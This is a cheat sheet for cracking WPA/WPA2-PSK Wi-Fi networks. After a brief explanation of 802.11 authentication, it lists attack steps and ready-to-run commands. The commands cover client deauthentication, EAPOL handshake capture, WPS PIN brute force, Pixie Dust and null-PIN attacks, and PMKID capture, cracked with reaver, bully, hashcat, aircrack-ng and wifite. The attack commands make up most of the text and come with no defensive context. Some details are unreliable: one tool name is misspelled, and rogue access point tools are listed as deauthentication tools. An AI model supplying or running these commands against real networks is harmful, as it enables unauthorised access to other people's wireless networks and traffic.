### 802.11 Sniffing WPA/WPA2 with PSK - 802.11 authentication is a process whereby the access point either accepts or rejects the identity of a radio NIC. The NIC begins the process by sending an authentication frame containing its identity to the access point. With open system authentication (the default), the radio NIC sends only one authentication frame, and the access point responds with an authentication frame as a response indicating acceptance (or rejection). Beacon frames are transmitted periodically to announce the presence of a wireless network and contain all information about it(data rates, channels, security ciphers, key management, etc.).

WPA/WPA2 Attack Process:
  1. Start and Deauthenticate with WPA/WPA2 Protected WLAN client by using WLAN tools Such as Hotspotter, Airsnarf, Karma, etc.
  2. If the Client is Deaauthenticated, then sniff the traffic and check the status of captured EAPOL Handshake.
  3. If the client is not Deauthenticate then do it again.
  4. Check whether the EAPOL handshake is captured or Not.
  5. Once you captured the EAPOL handshake, then perform a PSK Dictionary attack using coWPAtty, Aircrack-ng to gain confidential information.
  6. Add Time-memory trade-off method (Rainbow tables) also known as WPA-PSK Precomputation attack for cracking WPA/2 passphrase. Genpmk can be used to generate pre-computed hashes.
  7. If it’s Failed then Deauthenticate again and try to capture again and redo the above steps.

WPS PIN Attack:
    Known PINs + Generation Algorithms
      $ airgeddon.sh (Known PINs database based attack)
  
    WPS PIN Bruteforce (online)
      $ reaver -i mon0 -b <MAC_AP> -c <channel> -f -N [-L -d 2] -vv
      $ bully mon0 -b <MAC_AP> -c <channel>  -S -F -B -v 3
  
    WPS Pixie Dust Attack (offline)
      $ reaver -i mon0 -b <MAC_AP> -c <channel> -K -N -vv
      $ bully mon0 –b <MAC_AP> -d -v 3
  
    Null PIN attack
      $ reaver -i mon0 -b <MAC_AP> -c <channel> -f -N -g 1 -vv -p ''

  All above commands can be automated using: wifite --wps-only [--bully]

PMKID Capture (client-less) & Cracking:
      $ hcxdumptool -i mon0 -o capture.pcapng --enable_status=1 -c <channel>
      $ hcxpcaptool -E essidlist -I identitylist -U usernamelist -z capture.16800 capture.pcapng
      $ hashcat -m 16800 capture.16800 -a 0 -w 4 <wordlist>

  All above commands can be automated using: wifite --pmkid [--pmkid-timeout <sec>]

Handshake Capture (req. client) & Cracking:
      $ airdump-ng -c <channel> --bssid <AP_MAC> -w <capture> mon0
      $ aircrack-ng -a 2 -b <AP_MAC> -w  <wordlist> <capture>
      
  All above commands can be automated using: wifite --wpa [-dict <wordlist>]  
